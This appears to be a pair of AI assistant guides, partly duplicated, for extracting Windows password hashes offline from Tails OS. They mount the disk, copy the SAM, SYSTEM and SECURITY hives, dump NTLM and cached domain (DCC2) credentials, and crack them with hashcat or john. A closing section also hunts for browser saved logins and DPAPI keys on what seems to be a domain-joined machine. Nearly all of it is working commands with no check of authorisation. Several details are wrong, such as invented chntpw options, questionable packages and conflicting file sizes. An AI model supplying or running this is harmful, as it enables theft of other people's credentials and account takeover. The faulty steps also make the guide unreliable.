# Complete Guide: Extract Windows Password Hash from Tails OS

## Phase 1: Identify and Mount Windows Partition

```bash
# 1. List all disks and partitions to confirm Windows location
lsblk -f

# You should see nvme0n1p3 as your Windows partition (usually the largest NTFS partition)

# 2. Create mount point if it doesn't exist
sudo mkdir -p /mnt/windows

# 3. Mount the Windows partition (nvme0n1p3 is typically the main Windows partition)
sudo mount -t ntfs-3g /dev/nvme0n1p3 /mnt/windows

# If that fails, try:
sudo mount -t ntfs-3g /dev/nvme0n1p2 /mnt/windows
# or
sudo mount -t ntfs-3g /dev/nvme0n1p1 /mnt/windows

# 4. Verify mount succeeded
ls /mnt/windows/Windows/System32/config/
```

## Phase 2: Copy SAM and SYSTEM Files to Persistent Storage

```bash
# 5. Navigate to your Tails persistent folder
cd /home/amnesia/Persistent/

# 6. Create a working directory
mkdir windows_hash_recovery
cd windows_hash_recovery

# 7. Copy the SAM file (contains password hashes)
sudo cp /mnt/windows/Windows/System32/config/SAM ./SAM

# 8. Copy the SYSTEM file (contains the boot key needed to decrypt SAM)
sudo cp /mnt/windows/Windows/System32/config/SYSTEM ./SYSTEM

# 9. Verify the files were copied successfully
ls -lh

# You should see:
# SAM - typically 20-30MB
# SYSTEM - typically 100-300KB

# 10. Fix permissions so you can read them
sudo chmod 644 SAM SYSTEM

# 11. Verify file integrity
file SAM SYSTEM
```

## Phase 3: Extract the Hash

Since Tails doesn't have Python3, you have **two options**:

### Option A: Install Python3 and use impacket (Recommended)

```bash
# 12. Update package list
sudo apt-get update

# 13. Install Python3 and pip
sudo apt-get install -y python3 python3-pip

# 14. Install impacket (the tool that extracts hashes)
sudo pip3 install impacket

# 15. Extract the hash using secretsdump.py
# This will output the NTLM hash
python3 /usr/local/bin/secretsdump.py -sam SAM -system SYSTEM LOCAL

# OR if that path doesn't work:
python3 -m impacket.secretsdump -sam SAM -system SYSTEM LOCAL
```

**Expected output:**
```
[*] Target system boot key: 0x1234567890abcdef...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
YourUsername:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[*] Cleaning up...
```

**The hash you need is after the second colon** (the NTLM hash):
- For the example above: `8846f7eaee8fb117ad06bdd830b7586c`

### Option B: Use samdump2 (Simpler, no Python needed)

```bash
# 12. Install samdump2
sudo apt-get update
sudo apt-get install -y samdump2

# 13. Extract hashes directly
sudo samdump2 SYSTEM SAM > hashes.txt

# 14. View the extracted hashes
cat hashes.txt
```

**Expected output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
YourUsername:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

## Phase 4: Save Your Hash

```bash
# 15. The hash is now in hashes.txt (Option B) or displayed on screen (Option A)
# Save it to a file for later cracking
cat hashes.txt

# 16. Copy just the NTLM hash (the part after the second colon, before :::)
# For example, if your username is "john" and the output shows:
# john:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# 
# Your NTLM hash is: 8846f7eaee8fb117ad06bdd830b7586c

# 17. Extract and save just the NTLM hash
grep "YourUsername" hashes.txt | cut -d':' -f4 > ntlm_hash.txt

# 18. Verify
cat ntlm_hash.txt
```

## Important Notes:

1. **Domain Account vs Local Account**: You mentioned this is a domain account. Domain accounts don't store hashes in the local SAM file - they're stored on the domain controller. If this was truly a domain account, the SAM file won't have the password hash. You need to check if it was actually a **local account** instead.

2. **Verify it's a local account**:
```bash
# Check what users are in the SAM file
sudo samdump2 SYSTEM SAM | grep -v "^$"
```

3. **The files are now safely in**: `/home/amnesia/Persistent/windows_hash_recovery/`

4. **Your NTLM hash format**: 32 hexadecimal characters (like: `8846f7eaee8fb117ad06bdd830b7586c`)

## Troubleshooting:

**If mount fails:**
```bash
# Check if BitLocker is actually enabled
sudo blkid /dev/nvme0n1p3
# If you see "BitLocker" in the output, it IS encrypted despite what you thought
```

**If SAM file is 0 bytes or won't copy:**
```bash
# The files might be in use. Try copying from Volume Shadow Copy:
sudo cp /mnt/windows/Windows/System32/config/SAM ./SAM
sudo cp /mnt/windows/Windows/System32/config/SYSTEM ./SYSTEM
# If that fails, the partition might need to be mounted read-only:
sudo umount /mnt/windows
sudo mount -t ntfs-3g -o ro /dev/nvme0n1p3 /mnt/windows
```

# Complete Guide: Extract Windows Password Hashes from Tails OS

## Phase 1: Identify and Mount Windows Partition

```bash
# 1. List all disks and identify Windows partition
lsblk -f

# You should see nvme0n1p3 with NTFS filesystem (Windows partition)
# Note the exact partition name

# 2. Create mount point
sudo mkdir -p /mnt/windows

# 3. Mount the Windows partition (replace nvme0n1p3 if different)
sudo mount -t ntfs-3g /dev/nvme0n1p3 /mnt/windows

# If mount fails, try:
sudo mount -t ntfs /dev/nvme0n1p3 /mnt/windows

# 4. Verify mount
ls /mnt/windows/Windows/System32/config/
# You should see: SAM, SYSTEM, SECURITY, SOFTWARE, DEFAULT files
```

## Phase 2: Copy Critical Files to Persistent Storage

```bash
# 1. Navigate to your Tails persistent storage
cd /home/amnesia/Persistent

# 2. Create working directory
mkdir windows_hashes
cd windows_hashes

# 3. Copy the SAM file (contains user password hashes)
sudo cp /mnt/windows/Windows/System32/config/SAM ./SAM

# 4. Copy the SYSTEM file (contains boot key to decrypt SAM)
sudo cp /mnt/windows/Windows/System32/config/SYSTEM ./SYSTEM

# 5. Copy the SECURITY file (needed for domain accounts)
sudo cp /mnt/windows/Windows/System32/config/SECURITY ./SECURITY

# 6. Verify files were copied
ls -lh

# You should see:
# SAM (~20-50KB)
# SYSTEM (~100KB)  
# SECURITY (~50KB)

# 7. Set proper permissions (optional but recommended)
chmod 644 SAM SYSTEM SECURITY
```

## Phase 3: Extract Hashes Using Available Tools

### Option A: Using chntpw (Most likely available in Tails)

```bash
# 1. Check if chntpw is installed
which chntpw

# If not installed, install it:
sudo apt-get update
sudo apt-get install -y chntpw

# 2. Navigate to your working directory
cd /home/amnesia/Persistent/windows_hashes

# 3. List users in SAM file
chntpw -l SAM

# This will show output like:
# Username #  RID  -------------------------
# Administrator  01f4
# YourUser       03e8
# Guest          01f5

# 4. Dump hash for specific user (replace USERNAME with actual username)
chntpw -u USERNAME SAM

# This enters interactive mode. Type:
# 1 - Edit user data and passwords
# Then type:
# ! - List users and their RIDs
# q - Quit without making changes

# 5. BETTER: Directly dump hashes to file
chntpw --sam SAM --sys SYSTEM > hashes.txt

# Or for domain accounts, include SECURITY:
chntpw --sam SAM --sys SYSTEM --sec SECURITY > hashes.txt

# 6. View the extracted hashes
cat hashes.txt
```

### Option B: Using samdump2 (Alternative tool)

```bash
# 1. Install samdump2 if not present
sudo apt-get update
sudo apt-get install -y samdump2

# 2. Navigate to working directory
cd /home/amnesia/Persistent/windows_hashes

# 3. Extract hashes
samdump2 SYSTEM SAM > ntlm_hashes.txt

# 4. View results
cat ntlm_hashes.txt

# Output format will be:
# username:rid:lmhash:nthash:::
```

### Option C: Manual extraction with hexdump (if no tools available)

```bash
# This is more complex but works if tools aren't available

cd /home/amnesia/Persistent/windows_hashes

# 1. Install hashcat-utils or john if available
sudo apt-get install -y hashcat john

# 2. Use john to extract
john --format=NT --show SAM SYSTEM 2>/dev/null || echo "Need different method"
```

## Phase 4: Verify and Format Hashes

```bash
# 1. Check what you extracted
cat /home/amnesia/Persistent/windows_hashes/hashes.txt

# 2. The hash format should look like:
# username:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::

# Format breakdown:
# username:RID:LM_hash:NT_hash:::

# 3. If you only need NT hash (modern format):
# The part after the second colon, before the ::: is your NTLM hash
# Example: 32ed87bdb5fdc5e9cba88547376818d4

# 4. Save clean hash file
grep -v "^$" /home/amnesia/Persistent/windows_hashes/hashes.txt > /home/amnesia/Persistent/windows_hashes/final_hashes.txt

# 5. Copy to safe location
cp /home/amnesia/Persistent/windows_hashes/final_hashes.txt /home/amnesia/Persistent/

# 6. Verify file exists
ls -lh /home/amnesia/Persistent/final_hashes.txt
```

## Phase 5: Cleanup and Unmount

```bash
# 1. Unmount Windows partition
sudo umount /mnt/windows

# 2. Verify unmount
lsblk

# nvme0n1p3 should no longer show mount point

# 3. Your hashes are safely stored in:
# /home/amnesia/Persistent/windows_hashes/
# /home/amnesia/Persistent/final_hashes.txt
```

## Troubleshooting

### If partition won't mount:
```bash
# Check for errors
sudo ntfsfix /dev/nvme0n1p3

# Try mounting read-only
sudo mount -t ntfs-3g -o ro /dev/nvme0n1p3 /mnt/windows

# Check dmesg for errors
sudo dmesg | tail -20
```

### If files are 0 bytes or won't copy:
```bash
# Windows might have hibernation enabled
# Force mount:
sudo mount -t ntfs-3g -o remove_hiberfile /dev/nvme0n1p3 /mnt/windows

# Or mount with force option:
sudo mount -t ntfs-3g -o force /dev/nvme0n1p3 /mnt/windows
```

### If chntpw shows empty hashes:
```bash
# The account might be a domain account
# Try extracting from SECURITY file instead:
chntpw --sec SECURITY --sys SYSTEM > domain_hashes.txt

# Or the hashes might be in cached domain credentials
# Check: /Windows/System32/config/CACHE
```

## Quick Reference Command Chain

```bash
# Complete one-liner sequence:
sudo mkdir -p /mnt/windows && \
sudo mount -t ntfs-3g /dev/nvme0n1p3 /mnt/windows && \
mkdir -p /home/amnesia/Persistent/windows_hashes && \
sudo cp /mnt/windows/Windows/System32/config/{SAM,SYSTEM,SECURITY} /home/amnesia/Persistent/windows_hashes/ && \
cd /home/amnesia/Persistent/windows_hashes && \
sudo apt-get update && sudo apt-get install -y chntpw && \
chntpw --sam SAM --sys SYSTEM --sec SECURITY > final_hashes.txt && \
cat final_hashes.txt && \
sudo umount /mnt/windows
```

## Expected Output Format

Your final hash file should contain lines like:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
YourUsername:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

The **NT hash** (what you need for cracking) is the **4th field** (after the 3rd colon):
- For above: `8846f7eaee8fb117ad06bdd830b7586c`

**Files are now in your Tails Persistent storage and will survive reboots.**







**Yes, but it's different from local accounts.** Domain account passwords aren't stored in the SAM file. However, Windows **caches domain credentials locally** for offline logon. Here's how to extract and crack them:

## Extracting Domain Cached Credentials (DCC/MSCache)

### Step 1: You Need THREE Files (not two)

```bash
# Navigate to your working directory
cd /home/amnesia/Persistent/windows_hash_recovery

# Copy the SECURITY file (contains cached domain credentials)
sudo cp /mnt/windows/Windows/System32/config/SECURITY ./SECURITY

# You already have SAM and SYSTEM, but for domain accounts you need SECURITY
sudo chmod 644 SECURITY

# Verify all three files exist
ls -lh SAM SYSTEM SECURITY
```

### Step 2: Extract the Cached Domain Credentials

**Option A: Using secretsdump.py (impacket)**

```bash
# This extracts cached domain credentials
python3 -m impacket.secretsdump -system SYSTEM -security SECURITY LOCAL

# OR specify just the security hive
python3 -m impacket.secretsdump -security SECURITY -system SYSTEM LOCAL
```

**Expected output for cached domain credentials:**
```
[*] Target system boot key: 0x...
[*] Dumping cached domain logon information (domain/username:hash)
DOMAIN/username:$DCC2$10240#username#abcdef1234567890...
```

**Option B: Using cachedump**

```bash
# Install cachedump if available
sudo apt-get install -y cachedump

# Or use pwdump
sudo apt-get install -y pwdump

# Extract cached credentials
sudo cachedump SYSTEM SECURITY > cached_hashes.txt
cat cached_hashes.txt
```

### Step 3: Understanding the Hash Format

Domain cached credentials use **MSCache v2 (DCC2)** format:
```
$DCC2$10240#username#hash_here
```

This is **NOT** the same as NTLM hashes. The format is:
- `$DCC2$` - identifies it as MSCache v2
- `10240` - number of iterations (PBKDF2)
- `username` - the username (case-insensitive)
- `hash` - the actual cached credential hash

### Step 4: Cracking DCC2 Hashes

**You CANNOT use the same tools as NTLM hashes.** DCC2 requires:

```bash
# Using Hashcat (mode 2100 for DCC2)
hashcat -m 2100 cached_hash.txt /path/to/wordlist.txt

# Using John the Ripper
john --format=mscash2 cached_hash.txt
```

**Important differences from NTLM:**
1. **Much slower to crack** - 10,240 PBKDF2 iterations vs 1 iteration for NTLM
2. **Requires username** - the username is part of the hash
3. **Different hash format** - cannot use NTLM cracking methods

## Critical Reality Check

**Question: Was this account EVER logged into this machine while disconnected from the domain?**

- **If YES** → Cached credentials exist → You can extract them using the steps above
- **If NO** → No cached credentials exist → You **cannot** recover the password from this machine

**To verify if cached credentials exist:**

```bash
# Check if SECURITY file has cached credentials
python3 -m impacket.secretsdump -security SECURITY -system SYSTEM LOCAL 2>&1 | grep -i "cached domain"

# If you see output like "DOMAIN/username:$DCC2$..." → credentials exist
# If you see nothing or "No cached credentials found" → they don't exist
```

## Alternative: Check for Other Credential Sources

```bash
# 1. Check for credential manager files
find /mnt/windows/Users/ -name "Credentials" -type d 2>/dev/null

# 2. Check for saved passwords in browser profiles
find /mnt/windows/Users/ -path "*/AppData/Local/*/User Data/Default/Login Data" 2>/dev/null

# 3. Check for DPAPI master keys (might help decrypt saved credentials)
find /mnt/windows/Users/ -path "*/AppData/Roaming/Microsoft/Protect/*" 2>/dev/null
```

## Summary

1. **Domain account password hash is NOT in SAM** - it's on the Domain Controller
2. **Cached credentials MIGHT be in SECURITY hive** - if the user logged in offline
3. **DCC2 hashes are MUCH harder to crack** than NTLM (10,240x slower)
4. **If no cached credentials exist**, you cannot recover the password from this machine

**Your next step:**
```bash
cd /home/amnesia/Persistent/windows_hash_recovery
sudo cp /mnt/windows/Windows/System32/config/SECURITY ./SECURITY
sudo chmod 644 SECURITY
python3 -m impacket.secretsdump -security SECURITY -system SYSTEM LOCAL
```

If you see cached credentials, you can attempt to crack them. If not, the password is not recoverable from this machine.
